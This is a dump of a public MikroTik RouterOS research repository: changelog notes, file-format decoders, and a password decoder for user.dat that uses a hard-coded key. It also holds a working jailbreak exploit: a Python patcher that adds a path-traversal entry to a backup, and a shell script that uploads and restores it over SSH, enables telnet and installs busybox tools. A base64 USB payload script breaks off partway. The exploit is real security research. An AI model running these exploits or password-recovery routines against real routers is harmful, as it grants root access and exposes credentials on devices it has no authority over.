*) bugfixes;
*) WinBox now remembers opened windows;
*) added auto DNS name lookup in WinBox;

What's new in v2.9beta8:

*) fixed - router locked up immediately after startup sometimes;
*) made branding packages work again;
*) added possibility for web proxy to cache in memory;

What's new in v2.9beta7:

*) fixed write-sect-since-reboot counter, it was showing zero;
*) added ability for WinBox to connect to router directly over ethernet;
*) a lot of bugs are fixed;

What's new in v2.9beta6:

*) routerboard is able to reboot without serial cable attached;
*) a lot of PPPoE, PPTP and L2TP fixes;
*) a lot of other bug fixes;

What's new in v2.9beta5:

*) some of bugs are fixed;

What's new in v2.9beta4:

*) added regulatory domain support for atheros;
*) some of bugs are fixed;

What's new in v2.9beta3:

*) added check-gateway to routes;
*) loggin now works (with a lot of new features);
*) a lot of bugs are fixed;

What's new in v2.9beta2:

*) queues and firewall rules can be sorted in WinBox;
*) added more queue statistics;
*) improved system booting;
*) added radius authentication to DHCP server;
*) added client-id support to DHCP server;
*) added support for binding static leases to DHCP server interface;
*) a lot of bugs are fixed;

What's new in v2.9beta1:

*) reduced disk space requirement by 50%;
*) improved ip firewall with many more matchers, chains in NAT and mangle
   and more actions;
*) improved bridge firewall with more matchers, tables and chains;
*) increased speed of PPPoE, PPTP and L2TP connection creation, routerboard
   can now handle 3000 active PPPoE connections;
*) router boots much faster even with lots of queues;
*) added more statistics to queues;
*) added support for multiple DHCP clients;
*) all PPP interface active MTU & MRUs are reported;
*) PPPoE server can have limit on maximum served clients;
*) added support for memory testing;
*) added support for full cpu loading (to test overheating);
*) multiple serial consoles;
*) possibility to increase visible screen lines in the console;
*) winbox now uses only one TCP port to get plug-ins and send data;
*) routes now support recursive nexthop lookup;
*) console help format reworked;
*) added Nstreme support for Atheros wireless;
*) added dual link Nstreme for Atheros wireless;
*) more 802.11g support for Atheros wireless;
*) hardware encryption support for Atheros;
*) AES encryption support for wireless;
*) added BOOTP client support in DHCP server;

Caveats:

*) prefix list configuration is incompatible with previous versions;



File: /command_trees\README.md
# command trees
Command tree of RouterOS 6.40

![Overview](https://github.com/0ki/mikrotik-tools/raw/master/command_trees/__overview.png)


Please be aware that some files in this directory require a lot of RAM to load!

xviewer memory requirements on my system


```ip.png			3.7 GiB
interface.png		3.5 GiB
routing.png		2.1 GiB
tool.png		1.9 GiB
system.png		1.2 GiB
caps-man.png		1.1 GiB
ipv6.png		0.9 GiB
others		  <	600 MiB
```


File: /decode_backup.py
#!/usr/bin/python
# (C) Kirils Solovjovs, 2017

import sys,os,re
from struct import unpack

if len(sys.argv) > 1:
	if len(sys.argv) > 2:
		dir = sys.argv[2]
	else:
		dir = sys.argv[1]+"_contents/"
else:
	raise Exception("Usage: "+sys.argv[0]+" <RouterOS.backup> [output_folder]")


if not os.access(sys.argv[1], os.R_OK):
	raise Exception("Can't read file "+sys.argv[1])

if not os.path.exists(dir):
    os.makedirs(dir)

if not os.access(dir, os.W_OK):
	raise Exception("Directory "+dir+" not writeable")
	
if os.listdir(dir)!=[]:
	raise Exception("Directory "+dir+" not empty")

realsize=os.path.getsize(sys.argv[1])

with open(sys.argv[1], 'rb') as backup:
	hdr = backup.read(4)
	
	if realsize>=8 and hdr == "\xEF\xA8\x91\x72":
		raise Exception("Encrypted RouterOS backup files are not supported.")
		
	if realsize<8 or hdr != "\x88\xAC\xA1\xB1":
		raise Exception("Not a RouterOS backup file.")
			
	matchsize, = unpack("<I",backup.read(4))
	if matchsize != realsize:
		raise Exception("File is damaged.")

	while backup.tell()+4 < matchsize:
		
		file_name = backup.read(unpack("<I",backup.read(4))[0])
		index_cont = backup.read(unpack("<I",backup.read(4))[0])
		data_cont = backup.read(unpack("<I",backup.read(4))[0])
		print '%3d entries, %8d bytes,  ./%s' % (len(index_cont)/4, len(data_cont),file_name)
		
		file_name=re.sub('\.{2,}','_',file_name); #would not wanna be writing all over the place

		try:
			os.makedirs(dir+"/"+os.path.dirname(file_name))
		except OSError as exc:
			if exc.errno == 17:
				pass

		fo = open(dir+"/"+file_name+".idx", "wb")
		fo.write(index_cont);
		fo.close()

		fo = open(dir+"/"+file_name+".dat", "wb")
		fo.write(data_cont);
		fo.close()



File: /decode_blank.py
#!/usr/bin/python

from mt_dat_decoder import MTConfig

def onlyPrintable (s):
	 return s if all(c in map(chr, range(32, 127)) for c in s) else "!{non-printable string of len %i}" % len(s)

dir="."
database="dhcp/client"

conf = MTConfig(dir+"/"+database+".dat",dir+"/"+database+".idx")

#conf.returnTypes = True
conf.mapBlockNames( {
	"_be" : "Use Peer NTP"
	} )

conf.addFilter (0, lambda x: "No" ) # addFilter() works on block types or data types
conf.addFilter (1, lambda x: "Yes" )
conf.addFilter (str, onlyPrintable)
conf.addParser (0x12, lambda x: "0x%x" % x ) # addParser() works on block ids
#conf.addParser ("_u2", lambda x: x )

for record in conf:
	print(record)



File: /decode_supout.py
#!/usr/bin/python
# (C) Kirils Solovjovs, 2015

import sys,os,base64,zlib,re

#           111111 11112222
#01234567 89012345 67890123
#cdefgh56 78abGH12 34ABCDEF  (from)
#abcdefgh 12345678 ABCDEFGH  (to)
#revtribitmap=[2,3,4,5,6,7,12,13,14,15,0,1,22,23,8,9,10,11,16,17,18,19,20,21]
tribitmap=[10,11,0,1,2,3,4,5,14,15,16,17,6,7,8,9,18,19,20,21,22,23,12,13]

def tribit(content):
	#origlen=len(content)
	#while len(content)%3:
	#	content= content + "\x00"
		
	result=""
	for i in xrange(0, len(content) - 1,3):	
		goodtribit=0
		badtribit=ord(content[i])*0x10000+ord(content[i+1])*0x100+ord(content[i+2])
		for mangle in tribitmap:
			goodtribit = (goodtribit<<1) + (1 if ((badtribit & (0x800000>>mangle))>0) else 0)
			
		for move in [16,8,0]:
			result=result+chr((goodtribit >> move)& 0xff)

	return result
	#return result[0:origlen]

if len(sys.argv) > 1:
	if len(sys.argv) > 2:
		dir = sys.argv[2]
	else:
		dir = sys.argv[1]+"_contents/"
else:
	raise Exception("Usage: "+sys.argv[0]+" <supout.rif> [output_folder]")


if not os.access(sys.argv[1], os.R_OK):
	raise Exception("Can't read file "+sys.argv[1])

if not os.path.exists(dir):
    os.makedirs(dir)

if not os.access(dir, os.W_OK):
	raise Exception("Directory "+dir+" not writeable")
	
if os.listdir(dir)!=[]:
	raise Exception("Directory "+dir+" not empty")

i=0
with open(sys.argv[1], 'r') as my_file:
    sections=my_file.read().replace("--BEGIN ROUTEROS SUPOUT SECTION\r\n",":").replace("--END ROUTEROS SUPOUT SECTION\r\n",":").replace("::",":").split(":")
    for sect in sections:
			if len(sect.strip())>0:
				i= i + 1
				
				out = tribit(base64.b64decode(sect.replace("=","A")))
				
				[name,zipped]=out.split("\x00",1);
				print '%02d' % i,name.ljust(23),
				if not i%3:
					print
					
				res=zlib.decompress(zipped)
				fo = open(dir+"/"+str(i).zfill(2)+"_"+re.sub('[^a-z0-9\.-]','_',name), "wb")
				fo.write(res);
				fo.close()


File: /decode_user.py
#!/usr/bin/python
# (C) Kirils Solovjovs, 2017

import sys,md5,datetime
from socket import inet_ntop,AF_INET,AF_INET6

from mt_dat_decoder import MTConfig

def xor(data, key): 
    return str(bytearray(a^b for a, b in zip(*map(bytearray, [data, key])))).split("\x00",2)[0]

def parseIPv4(data):
	return inet_ntop(AF_INET, chr(data & 0xFF) + chr(data >> 8 & 0xFF)+ chr(data >> 16 & 0xFF)+ chr(data >> 24 & 0xFF))

def parseIPv6(data):
	return inet_ntop(AF_INET6,''.join(map(chr,data)))
	
def parseAddressNet(data):
	ip = None
	netmask = None
	
	for blocktype in data:
		if blocktype == "_u1" or blocktype == "_u5" :
			ip = parseIPv4(data[blocktype])
		elif blocktype =="_a3":
				ip = parseIPv6(data[blocktype])
		elif blocktype =="_u4":
			netmask = str(data[blocktype])
		elif blocktype == "_u2" or blocktype == "_u6" :
			netmask = str(bin(data[blocktype]).count("1"))
			
	if ip and netmask:
		return ip+"/"+netmask


def parseMTdate(data):
	return datetime.datetime.fromtimestamp(data).strftime('%b/%d/%Y %H:%M:%S')

def parseMTusergroup(data):
	# this may be incorrect. depends on group.dat ;)
	groups = ["read","write","full"]
	if data>=0 and data<len(groups):
		return groups[data]

	
if len(sys.argv) > 1:
	dir = sys.argv[1]
else:
	dir = "."

database="user"

conf = MTConfig(dir+"/"+database+".dat",dir+"/"+database+".idx")

conf.mapBlockNames( {0xb:"permissions", 0x1f:"last_login", 0x1c:"password_set",
					0x1:"username",0x11:"password",0x2:"group",0x12:"groupname",
					0x10:"allowed_addresses",0x5:"allowed_ip4", 0x6:"allowed_net4" })

conf.addParser (0x1f, parseMTdate)
conf.addParser (0x12, parseMTusergroup)
conf.addParser (0xb, lambda x: "%x" % x)
conf.addParser (0x5, parseIPv4)
conf.addParser (0x6, parseIPv4)
conf.addParser (0x10, parseAddressNet)


for record in conf:
	if "username" in record and "password" in record: # http://hop.02.lv/2Wb
		record["#key"]=md5.new(record["username"]+"283i4jfkai3389").digest()	
		record["password"]=xor(record["password"],record["#key"]*16)
		record["#key"]=" ".join("{:02x}".format(ord(c)) for c in record["#key"])

	print(record)
	


File: /encode_supout.py
#!/usr/bin/python
# (C) Kirils Solovjovs, 2015

import sys,base64,zlib

#           111111 11112222
#01234567 89012345 67890123
#cdefgh56 78abGH12 34ABCDEF  (from)
#abcdefgh 12345678 ABCDEFGH  (to)
revtribitmap=[2,3,4,5,6,7,12,13,14,15,0,1,22,23,8,9,10,11,16,17,18,19,20,21]
#tribitmap=[10,11,0,1,2,3,4,5,14,15,16,17,6,7,8,9,18,19,20,21,22,23,12,13]

def revtribit(content):
	#origlen=len(content)
	
	while len(content)%3:
		content= content + "\x00"
		
	result=""
	for i in xrange(0, len(content) - 1,3):	
		goodtribit=0
		badtribit=ord(content[i])*0x10000+ord(content[i+1])*0x100+ord(content[i+2])
		for mangle in revtribitmap:
			goodtribit = (goodtribit<<1) + (1 if ((badtribit & (0x800000>>mangle))>0) else 0)
			
		for move in [16,8,0]:
			result=result+chr((goodtribit >> move)& 0xff)

	return result
	#return result[0:origlen]



if len(sys.argv) < 2:
	raise Exception("Usage: "+sys.argv[0]+" <section_name> [contentfile (or stdin)]")

if len(sys.argv) > 2:
	data=open(sys.argv[2],"rb")
else:
	data=sys.stdin
	
data=sys.argv[1]+"\x00"+zlib.compress(data.read())
reallen=len(base64.b64encode(data).replace("=",""))
data=base64.b64encode(revtribit(data))
data=data[:reallen]+"="*(len(data)-reallen)

sys.stdout.write("--BEGIN ROUTEROS SUPOUT SECTION\r\n");
sys.stdout.write("\r\n".join(data[i:i+76] for i in xrange(0, len(data), 76)))
sys.stdout.write("\r\n--END ROUTEROS SUPOUT SECTION\r\n");


File: /exploit-backup\exploit_b.py
#!/usr/bin/python
# (C) Kirils Solovjovs, 2017

import sys,os
from struct import pack,unpack

def err(text):
	print text
	print
	quit(1)
	

if len(sys.argv) < 2:
	err("Usage: "+sys.argv[0]+" <backup_file>")

file=sys.argv[1]

if not os.path.exists(file):
	err("Directory "+file+" does not exist.")

if not os.access(file, os.R_OK) or not os.access(file, os.W_OK):
	err("File should be marked read/write. Check permissions.")

realsize=os.path.getsize(file)

with open(file,'r+b') as backup:

		if realsize<8 or backup.read(4) != "\x88\xAC\xA1\xB1":
			err("Please check that this is a recent RouterOS backup file w/o password protection.")
			
		matchsize, = unpack("<I",backup.read(4))
		if matchsize != realsize:
			err("File is damaged. Will not proceed.")

		#first we write our payload
		backup.seek(matchsize)
		
		backup.write("\x1E\x00\x00\x00\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F"+
			"\x6E\x6F\x76\x61\x2F\x65\x74\x63\x2F\x64\x65\x76\x65\x6C\x2D"+
			"\x6C\x6F\x67\x69\x6E\x2F\x00\x00\x00\x00\x00\x00\x00\x00")
		
		#finally we need to increase the size by 42
		matchsize += 42
		backup.seek(4)
		backup.write(pack("<I",matchsize))
		backup.close()
		
		print "Done. Now restore from "+file+"."
		print


File: /exploit-backup\exploit_full.sh
#!/bin/bash
# (C) Janis Jansons, Kirils Solovjovs, 2017-2018

if [ "$(ps -o comm= $PPID)" == "ssh" ]; then
	cat /tmp/.pass
	exit 0
fi


function cleanup {
  rm /tmp/.pass 2> /dev/null
  rm -- jb_*.backup 2> /dev/null
}

trap cleanup EXIT

vercomp () {
    #(C) Dennis Williamson, 2010, https://stackoverflow.com/questions/4023830/how-to-compare-two-strings-in-dot-separated-version-format-in-bash
    if [[ $1 == $2 ]]
    then
        return 0
    fi
    local IFS=.
    local i ver1=($1) ver2=($2)
    # fill empty fields in ver1 with zeros
    for ((i=${#ver1[@]}; i<${#ver2[@]}; i++))
    do
        ver1[i]=0
    done
    for ((i=0; i<${#ver1[@]}; i++))
    do
        if [[ -z ${ver2[i]} ]]
        then
            # fill empty fields in ver2 with zeros
            ver2[i]=0
        fi
        if ((10#${ver1[i]} > 10#${ver2[i]}))
        then
            return 1
        fi
        if ((10#${ver1[i]} < 10#${ver2[i]}))
        then
            return 2
        fi
    done
    return 0
}

cd "$(dirname "$(echo $0)")"

rm /tmp/PASSOUT 2> /dev/null
echo "* Not affiliated with Mikrotikls or Oracle *"
echo
echo "Welcome to jailbreak tool v1.92 for MikroTik devices"
echo "                                    by PossibleSecurity.com"
echo 
echo "WARNING! THIS TOOL IS LIKELY TO BRICK YOUR DEVICE. USE AT YOUR OWN RISK."
echo "AUTHORS OF THIS TOOL MAY NOT BE HOLD LIABLE FOR ANY DIRECT OR"
echo "INDIRECT DAMAGES CAUSED AS A RESULT OF USING THIS TOOL."
echo 
echo "If <<brick>> happens, go for netinstall to recover."
echo 
echo " * * * * * * * * "

JBID="jb_$$_$RANDOM.backup" #.backup is important

echo "We'll need the IP address of the device, user and password."
while true; do
	echo -n "IP [192.168.88.1]: "
	read IP
	echo -n "USER [admin]: "
	read USER
	echo -n "PASS []: "
	read PASS
	[ "$IP" == "" ] && IP="192.168.88.1"
	[ "$USER" == "" ] && USER="admin"
	echo 
	echo "We got $USER@$IP with password '$PASS'."
	while true; do
		echo -n "Is this correct? (y/N) "
		read confirm
		[ -z "$confirm" ] && echo "Please enter 'yes' or 'no'!" || break
	done

	[ "${confirm:0:1}" == "y" -o "${confirm:0:1}" == "Y" ] && break
	echo "Try again, please."
done


echo -n "$PASS" > /tmp/.pass


echo 
echo "Let's begin."

ping -c1 $IP &> /dev/null
[ $? -ne 0 ] && echo ERROR: IP address must respond to ICMP echo requests. && exit 1

echo "Verifying version..."
res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/system resource print" 2>/dev/null )"
[ "$?" -ne "0" ] && echo ERROR: Unable to connect to $IP:22 with user $USER. && exit 1

arch="$(echo $res |tr $'\r' $'\n'| grep architecture-name |cut -d : -f 2|tr -dc [a-zA-Z0-9]_ )"
version="$(echo $res |tr $'\r' $'\n'| grep version |cut -d : -f 2|cut -d \( -f 1|tr -dc [a-zA-Z0-9]._ )"

version_cmp="$(echo $version | sed s/rc.*$//)"

version_rc="$(echo $version |grep rc | sed s/^.*rc//)"

vercomp "$version_cmp" "2.9.8"
[ $? -eq 2 ] && echo "Software $version is not supported by this tool. The first supported version is 2.9.8." && exit 9
vercomp "$version_cmp" "6.42"
[ ! $? -eq 2 ] && echo "Software $version is not supported by this tool. The last supported versoin is 6.41rc56." && exit 9
vercomp "$version_cmp" "6.41"
if [ $? -eq 0 ]; then
	[ -z "$version_rc" ] && version_rc="99"
	vercomp "$version_rc" "61"
	[ ! $? -eq 2 ] && echo "Software $version is not supported by this tool. The last supported versoin is 6.41rc56." && exit 9
fi

res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/system backup save name=\"$JBID\" dont-encrypt=yes" 2> /dev/null)"
[ "$?" -ne "0" ] && echo ERROR: Unable to connect to $IP:22 with user $USER. && exit 1

if ! [[ "$res" =~ "backup saved" ]]; then
	#try an older version approach
	res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/system backup save name=\"$JBID\"" 2> /dev/null)"
	[ "$?" -ne "0" ] && echo ERROR: Unable to connect to $IP:22 with user $USER. && exit 1
	! [[ "$res" =~ "backup saved" ]] && echo ERROR: Unable to export current configuration. && exit 1
fi


echo "Downloading current configuration..."
! [[ "$res" =~ "backup saved" ]] && echo ERROR: Unable to export current configuration. && exit 1
DISPLAY="none" SSH_ASKPASS="$0" setsid scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "$USER@$IP:/$JBID" "./$JBID" 2> /dev/null
[ "$?" -ne "0" ] && echo ERROR: Unable to download current configuration from $IP:22 with user $USER. && exit 1
[ ! -f "$JBID" ] && echo ERROR: Download failed. This should never happen. && exit 1

echo "Patching..."

#cp $JBID orig_$JBID
[ -z "$(./exploit_b.py $JBID |grep "^Done\.")" ] && echo ERROR: Unable to patch current configuration. && exit 1

echo "Uploading exploit..."
DISPLAY="none" SSH_ASKPASS="$0" setsid scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "./$JBID" "$USER@$IP:/$JBID" 2> /dev/null
[ "$?" -ne "0" ] && echo ERROR: Unable to upload configuration with payload to $IP:22 with user $USER. && exit 1

res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/system backup load name=\"$JBID\" password=\"\"" 2> /dev/null)"
[ "$?" -ne "0" ] && echo ERROR: Unable to connect to $IP:22 with user $USER. && exit 1

if ! [[ "$res" =~ "configuration restored" ]]; then
	#try an older version approach
	res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/system backup load name=\"$JBID\"" 2> /dev/null)"
	[ "$?" -ne "0" ] && echo ERROR: Unable to connect to $IP:22 with user $USER. && exit 1
	! [[ "$res" =~ "configuration restored" ]] && echo ERROR: Unable to apply patched configuration. && exit 1
fi

echo
echo " * * * * * * * * "
echo "Congrats! Jailbreak was (likely) successfull. Device will now reboot."
echo " * * * * * * * * "
echo "Linux mode can be accessed via telnet using user 'devel' with admin's password."
echo 

echo "Device is now rebooting..."

[ ! -f "busybox-$arch" ] && echo "As we do not have binaries for your architecture ($arch) you are all set." && exit 0

echo "You may opt to install additional utilities to make using the shell easier."
echo "Please note that this will enable telnet service on port 23/tcp, "
echo "send YOUR PASSWORD AND USERNAME UNENCRYPTED over the network, and"
echo "   may REMOVE YOUR ABILITY TO UPDATE software on smaller devices."
echo

while true; do
	echo -n "Would you like some additional utilities with your jailbreak? (y/N) "
	read confirm
	[ -z "$confirm" ] && echo "Please enter 'yes' or 'no'!" || break
done

! [ "${confirm:0:1}" == "y" -o "${confirm:0:1}" == "Y" ] && echo You are on your own. Good luck. && exit 0

echo "Waiting for device to reboot..."
sleep 10

echo "Waiting for device to become available..."
until ping -c1 $IP &>/dev/null; do :; done

c=0
while true; do #just making sure that we're all up
	echo "Connecting..."
	res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/" 2> /dev/null)"
	[ "$?" -eq "0" ] && break
	sleep 2
	c=$(( $c + 1 ))
	[ $c -gt 10 ] && echo ERROR: Connection failed. && exit 2
done

echo "Uploading binaries..."
DISPLAY="none" SSH_ASKPASS="$0" setsid scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "./busybox-$arch" "$USER@$IP:/busybox_p" 2> /dev/null #this is separate because of rename
[ "$?" -ne "0" ] && echo ERROR: Unable to upload binaries. && exit 2
DISPLAY="none" SSH_ASKPASS="$0" setsid scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "./slave.sh" "$USER@$IP:" 2> /dev/null
[ "$?" -ne "0" ] && echo ERROR: Unable to upload binaries. && exit 2

echo "Enabling telnet..."
res="$(DISPLAY="none" SSH_ASKPASS="$0" setsid ssh -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -l "$USER" "$IP" "/ip service set disabled=no port=23 telnet" 2> /dev/null)"
[ ! -z "$res" ] && echo ERROR: Failed to enable telnet. && exit 2

echo -n "Setting up..."
status="$(
(sleep 1; echo "devel"; sleep 0.5; echo "$PASS"; sleep 0.5
echo "chmod a+x slave.sh"; sleep 0.5; echo "./slave.sh"; sleep 5; echo "reboot &"; sleep 3
) | telnet "$IP" 2>&1 )"


echo "$status" |grep 888|tr -d 8

sleep 1

echo
echo "Please be aware that telnet will stay enabled on 23/tcp!"
echo
echo "Enjoy your new shell via telnet using user 'devel' with admin's password."
echo 

exit 0






File: /exploit-backup\slave.sh
#!/bin/ash
# (C) Kirils Solovjovs, 2017

[ ! -f "busybox_p" ] && echo 888fail && exit 1

case "$PATH" in
	*/usr/local/bin*)
	# old versions
		dest="/usr/local/bin/"
	;;
	*)
		dest="/flash/bin/"
		if [ ! -d "/flash/" ]; then
			echo 888fail && exit 1
		fi
	;;
esac 

mkdir -p $dest

export PATH=$PATH:$dest

mv busybox_p $dest/busybox_p
chmod a+x $dest/busybox_p
cd $dest/
for target in "[" "[[" acpid add-shell addgroup adduser adjtimex arp arping ash awk base64 basename beep blkid blockdev bootchartd brctl bunzip2 bzcat bzip2 cal cat catv chat chattr chgrp chmod chown chpasswd chpst chroot chrt chvt cksum clear cmp comm conspy cp cpio crond crontab cryptpw cttyhack cut date dc dd deallocvt delgroup deluser depmod devmem df dhcprelay diff dirname dmesg dnsd dnsdomainname dos2unix du dumpkmap dumpleases echo ed egrep eject env envdir envuidgid ether-wake expand expr fakeidentd false fbset fbsplash fdflush fdformat fdisk fgconsole fgrep find findfs flock fold free freeramdisk fsck fsck.minix fsync ftpd ftpget ftpput fuser getopt getty grep groups gunzip gzip halt hd hdparm head hexdump hostid hostname httpd hush hwclock id ifconfig ifdown ifenslave ifplugd ifup inetd insmod install ionice iostat ip ipaddr ipcalc ipcrm ipcs iplink iproute iprule iptunnel kbd_mode kill killall killall5 klogd last less linux32 linux64 linuxrc ln loadfont loadkmap logger login logname logread losetup lpd lpq lpr ls lsattr lsmod lsof lspci lsusb lzcat lzma lzop lzopcat makedevs makemime man md5sum mdev mesg microcom mkdir mkdosfs mke2fs mkfifo mkfs.ext2 mkfs.minix mkfs.vfat mknod mkpasswd mkswap mktemp modinfo modprobe more mount mountpoint mpstat mt mv nameif nanddump nandwrite nbd-client nc netstat nice nmeter nohup nslookup ntpd od openvt passwd patch pgrep pidof ping ping6 pipe_progress pivot_root pkill pmap popmaildir powertop printenv printf ps pscan pstree pwd pwdx raidautorun rdate rdev readahead readlink readprofile realpath reformime remove-shell renice reset resize rev rm rmdir rmmod route rpm rpm2cpio rtcwake run-parts runlevel runsv runsvdir rx script scriptreplay sed sendmail seq setarch setconsole setfont setkeycodes setlogcons setserial setsid setuidgid sh sha1sum sha256sum sha3sum sha512sum showkey slattach sleep smemcap softlimit sort split start-stop-daemon stat strings stty su sulogin sum sv svlogd swapoff swapon switch_root sync sysctl syslogd tac tail tar tcpsvd tee telnet telnetd test tftp tftpd time timeout top touch tr traceroute traceroute6 true tty ttysize tunctl udhcpc udhcpd udpsvd umount uname unexpand uniq unix2dos unlzma unlzop unxz unzip uptime users usleep uudecode uuencode vconfig vi vlock volname wall watch watchdog wc wget which who whoami whois xargs xz xzcat yes zcat zcip; do
	ln -s busybox_p $target 2> /dev/null
done
sleep 1
sync
cd -

ln -s / .root

#do appreciate the dns magic :)
echo "nameserver 8.8.8.8" > /rw/resolve.conf
sed -i "s#/etc/resolv.conf#/rw/resolve.conf#" $dest/busybox_p

echo 888ok
sleep 1

rm slave.sh


File: /exploit-defconf\make_usb.sh
#!/bin/bash
# (C) Kirils Solovjovs, 2018
[ -z "$1" ] && echo "Usage: $0 <device>" && echo Warning: This will _overwrite_ the device with magic MT USB. && exit 1
[ ! -b "$1" ] && echo "Not a block device." && exit 2

set -e
echo "
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
